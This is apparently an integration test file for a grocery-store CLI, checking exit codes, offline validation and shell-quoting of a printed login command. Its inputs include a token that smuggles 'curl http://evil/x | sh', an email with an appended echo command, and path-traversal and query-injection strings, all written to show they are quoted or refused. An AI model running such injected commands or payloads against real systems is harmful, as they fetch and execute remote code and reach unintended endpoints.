/**
 * Integration coverage for `main()`.
 *
 * Round-2 review found that NOTHING in the suite invoked `main()`: the exit-code
 * split and the `cart add` verdict could both be reverted to their original
 * buggy form and every test stayed green. The behaviour was correct and
 * unproven, which is indistinguishable from correct-by-accident.
 *
 * These spawn the real CLI and exercise only paths that fail BEFORE any network
 * call. That property was CLAIMED here once before and was false: `case "cart"`
 * fetched the cart ahead of the subcommand switch, so `d1 cart bogus` issued a
 * live POST that created an orderForm on D1's production storefront before
 * deciding the command was invalid — 531ms versus 51ms for a genuinely offline
 * usage error. Every test run wrote to a third party, and every one of these
 * assertions silently depended on egress.
 *
 * `validateCartArgs` now runs first, and `no cart command touches the network
 * before validating` below MEASURES the property rather than asserting it in a
 * comment.
 */

import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import { loginFollowUp } from "../src/cli.ts";

const CLI = join(import.meta.dir, "..", "src", "cli.ts");
const CONFIG = join(process.env.TMPDIR ?? "/tmp", `d1-exit-${process.pid}`);

async function run(
  args: string[],
  env: Record<string, string> = {},
): Promise<{ code: number; stderr: string }> {
  const p = Bun.spawn(["bun", "run", CLI, ...args], {
    env: { ...process.env, D1_CONFIG_DIR: CONFIG, ...env },
    stdout: "pipe",
    stderr: "pipe",
  });
  const stderr = await new Response(p.stderr).text();
  await new Response(p.stdout).text();
  return { code: await p.exited, stderr };
}

/**
 * A proxy pointed at a closed port, so any request the CLI attempts fails
 * immediately and visibly.
 *
 * This replaces the wall-clock threshold that used to stand in for "made no
 * request". Timing was only ever a proxy for the property, and it was a
 * fragile one from both ends: at 350ms it sat 1.15x clear of the ~405ms region
 * GET it had to reject and let a real regression through, and at 200ms it
 * risked failing on a loaded CI runner for reasons that have nothing to do
 * with the network. Process-start cost and network latency are independent
 * axes, so no single number separates them on every machine.
 *
 * Breaking the network instead turns the property into an exit code: a command
 * that requests anything gets 1, a command that requests nothing keeps 2. That
 * is machine-speed independent and directly observable.
 */
const DEAD_PROXY = {
  HTTPS_PROXY: "http://127.0.0.1:1",
  HTTP_PROXY: "http://127.0.0.1:1",
  https_proxy: "http://127.0.0.1:1",
  http_proxy: "http://127.0.0.1:1",
};

describe("exit codes are a contract an agent can branch on", () => {
  test("a usage error exits 2, never 1", async () => {
    // 1 means "D1 refused or was unreachable" and invites a retry; 2 means the
    // call itself was wrong and retrying it verbatim can never help. Collapsing
    // them leaves a caller retrying a typo forever.
    for (const args of [
      ["suggest"],
      ["quote"],
      ["order"],
      ["region"],
      ["search", "--lat", "4.65"],
      ["cart", "add"],
      ["cart", "set", "0"],
      ["cart", "bogus-subcommand"],
      ["totally-unknown-command"],
      ["substitute"],
      ["substitute", "abc"],
      ["substitute", "262 OR productId:1"],
      ["substitute", "262", "--limit", "0"],
      ["substitute", "262", "--limit", "abc"],
      ["substitute", "262", "--lat", "4.65"],
    ]) {
      const { code } = await run(args);
      expect({ args, code }).toEqual({ args, code: 2 });
    }
  }, 90_000);

  test("a malformed --qty exits 2 and says why", async () => {
    const { code, stderr } = await run(["cart", "add", "262", "--qty", "abc"]);
    expect(code).toBe(2);
    expect(stderr).toMatch(/positive whole number/);
  }, 20_000);

  test("a non-integer cart index exits 2, not 1", async () => {
    // These reach cart.ts's own guard, which raises a plain D1Error — exit 1,
    // i.e. "D1 refused", about the caller's own malformed input.
    expect((await run(["cart", "set", "0", "1.5"])).code).toBe(2);
    expect((await run(["cart", "set", "-1", "3"])).code).toBe(2);
  }, 30_000);

  test("--help exits 0 and bare invocation exits 2", async () => {
    expect((await run(["--help"])).code).toBe(0);
    expect((await run([])).code).toBe(2);
  }, 20_000);

  test("a refused endpoint fails closed rather than being requested", async () => {
    // The runtime allowlist. This must NOT reach the network, so it is safe in
    // a network-free suite.
    const { code, stderr } = await run([
      "search",
      "--facets",
      "../../../../../../api/checkout/pub/orderForm/OF1/transaction",
    ]);
    // Pinned to 2, not `> 0`: a malformed --facets is a USAGE error. The loose
    // form was the only imprecise assertion in a file whose entire job is
    // pinning exit codes, and it papered over this exact case returning 1.
    expect(code).toBe(2);
    expect(stderr).toMatch(/may not contain/);
  }, 20_000);
});

describe("a usage error costs nothing and does not depend on D1", () => {
  /**
   * Asserts the network-free property by BREAKING the network, not by timing it.
   *
   * A usage error that reaches the network is wrong twice: it writes to a third
   * party's production storefront on every typo (and every test run), and it
   * makes the exit code depend on D1's availability — with the network down the
   * caller saw 1 ("D1 refused, retry may help") for its own malformed input.
   *
   * With every request routed at a closed port, the property becomes an exit
   * code rather than a stopwatch reading: request anything and you get 1,
   * request nothing and you keep 2. See {@link DEAD_PROXY} for why the
   * stopwatch was abandoned.
   */
  test("the dead proxy really does break the network (anti-vacuity control)", async () => {
    // Without this, every assertion below passes trivially on any machine or
    // Bun version where the proxy variables are ignored: the request would
    // simply succeed, and a command that made one would still exit 2.
    const { code } = await run(["region", "--lat", "4.75068", "--lng", "-74.03532"], DEAD_PROXY);
    expect(code).toBe(1);
  }, 30_000);

  test("no cart usage error makes a request", async () => {
    for (const args of [
      ["cart", "bogus-subcommand"],
      ["cart", "add"],
      ["cart", "add", "262", "--qty", "abc"],
      ["cart", "set", "0"],
      ["cart", "set", "0", "1.5"],
      ["cart", "set", "-1", "3"],
    ]) {
      const { code } = await run(args, DEAD_PROXY);
      expect({ args, code }).toEqual({ args, code: 2 });
    }
  }, 60_000);

  test("no substitute usage error makes a request, INCLUDING with --lat/--lng", async () => {
    // The `--lat/--lng` rows are the point. `pointFrom` -> `regionFor` issues a
    // live region lookup, so validating the SKU inside `findSubstitutes` meant
    // `d1 substitute abc --lat .. --lng ..` called D1 to resolve a region for a
    // SKU that was never going to parse — and with D1 unreachable, returned 1
    // ("retry may help") for the caller's own typo. Exactly the `d1 cart bogus`
    // shape this file was written for, one command later.
    for (const args of [
      ["substitute"],
      ["substitute", "abc"],
      ["substitute", "abc", "--lat", "4.75068", "--lng", "-74.03532"],
      ["substitute", "262 OR productId:1", "--lat", "4.75068", "--lng", "-74.03532"],
      ["substitute", "262", "--limit", "0", "--lat", "4.75068", "--lng", "-74.03532"],
      ["substitute", "262", "--count", "0", "--lat", "4.75068", "--lng", "-74.03532"],
      ["substitute", "262", "--count", "abc", "--lat", "4.75068", "--lng", "-74.03532"],
      // `--sc` is user input that goes straight into a query parameter. The new
      // query guard refuses a non-numeric one — correctly — but as a D1Error
      // reading "This is a bug in d1-cli", which exits 1 and invites a retry of
      // the caller's own typo. Validated up front now, on every command.
      ["substitute", "262", "--sc", "abc"],
      ["search", "leche", "--sc", "../../evil"],
      ["region", "--lat", "4.75068", "--lng", "-74.03532", "--sc", "1;2"],
    ]) {
      const { code } = await run(args, DEAD_PROXY);
      expect({ args, code }).toEqual({ args, code: 2 });
    }
  }, 90_000);
});

describe("the login follow-up prints ONE command", () => {
  test("an auth token from upstream cannot append a second one", () => {
    // The third injection site, and the worst: no `sanitize`, an upstream
    // value, and a line that literally says "Finish with:" in the flow where an
    // agent is most likely to paste it unread. It predates this release; the
    // release that names the rule is the one that should hold to it.
    const out = loginFollowUp("shopper@example.com", "eyJhbGc; curl http://evil/x | sh #");
    expect(out).toContain("--auth-token 'eyJhbGc; curl http://evil/x | sh #'");
    expect(out).not.toContain("--auth-token eyJhbGc;");
  });

  test("an email from the command line is quoted too", () => {
    const out = loginFollowUp("a@b.com; echo PWNED", "tok");
    expect(out).toContain("--email 'a@b.com; echo PWNED'");
    expect(out).not.toContain("--email a@b.com;");
  });

  test("an ordinary login still reads as a runnable command", () => {
    // So the gate cannot pass by mangling every input.
    const out = loginFollowUp("shopper@example.com", "eyJhbGciOiJFUzI1NiJ9");
    expect(out).toContain("d1 login --email 'shopper@example.com'");
    expect(out).toContain("--auth-token 'eyJhbGciOiJFUzI1NiJ9' --code <code>");
  });
});

describe("the new commands validate BEFORE the network", () => {
  // Under DEAD_PROXY anything that reaches the network exits 1, so a guard that
  // runs first is observable as a 2. Every one of these survived deletion with
  // the unit suite green, because nothing invoked `main()` for them.

  test("a bare --brand is refused rather than silently dropped", async () => {
    // `str()` maps a valueless flag to undefined, so without the guard control
    // falls through to the UNBRANDED basket: the shopper asks for a brand
    // comparison, gets an ordinary basket, and is told nothing.
    const { code } = await run(
      ["basket", "--budget", "50000", "arroz", "--lat", "4.75", "--lng", "-74.03", "--brand"],
      DEAD_PROXY,
    );
    expect(code).toBe(2);
  });

  test("an empty or whitespace --brand is refused too", async () => {
    for (const v of ["", "   "]) {
      const { code } = await run(
        ["basket", "--budget", "50000", "arroz", "--lat", "4.75", "--lng", "-74.03", "--brand", v],
        DEAD_PROXY,
      );
      expect(code).toBe(2);
    }
  });

  test("a real --brand does reach the network (anti-vacuity control)", async () => {
    // Without this the two above pass for a `basket` command that refuses
    // everything.
    const { code } = await run(
      [
        "basket",
        "--budget",
        "50000",
        "arroz",
        "--lat",
        "4.75",
        "--lng",
        "-74.03",
        "--brand",
        "LATTI",
      ],
      DEAD_PROXY,
    );
    expect(code).toBe(1);
  });

  test("`d1 stores` rejects an unknown subcommand offline", async () => {
    // The comment on this guard states its own failure mode — "silently meaning
    // near and then changing meaning later" — and had no test.
    const { code } = await run(
      ["stores", "nearby", "--lat", "4.75", "--lng", "-74.03"],
      DEAD_PROXY,
    );
    expect(code).toBe(2);
  });

  test("`d1 stores near` rejects a bad --limit offline", async () => {
    for (const v of ["0", "-3", "abc"]) {
      const { code } = await run(
        ["stores", "near", "--lat", "4.75", "--lng", "-74.03", "--limit", v],
        DEAD_PROXY,
      );
      expect(code).toBe(2);
    }
  });

  test("`d1 stores near` with a valid limit DOES reach the network", async () => {
    const { code } = await run(
      ["stores", "near", "--lat", "4.75", "--lng", "-74.03", "--limit", "5"],
      DEAD_PROXY,
    );
    expect(code).toBe(1);
  });

  test("`d1 stores near` needs a coordinate", async () => {
    const { code } = await run(["stores", "near"], DEAD_PROXY);
    expect(code).toBe(2);
  });
});

describe("an unreadable registry answer is not exit 3", () => {
  test("exit 3 is reserved for 'the answer is genuinely none'", async () => {
    // The render refuses to call an unreadable answer an empty neighbourhood;
    // the exit code was calling it one, and an agent branching on 3 — documented
    // CLI-wide as never worth retrying — would have recorded the false fact.
    //
    // Driven through the real `storesExit` decision rather than the network,
    // which cannot be made to serve malformed entries from here.
    const { storesExit } = await import("../src/cli.ts");
    expect(storesExit({ stores: [{}], dropped: 0 })).toBe(0);
    expect(storesExit({ stores: [], dropped: 0 })).toBe(3);
    expect(storesExit({ stores: [], dropped: 30 })).toBe(1);
  });
});
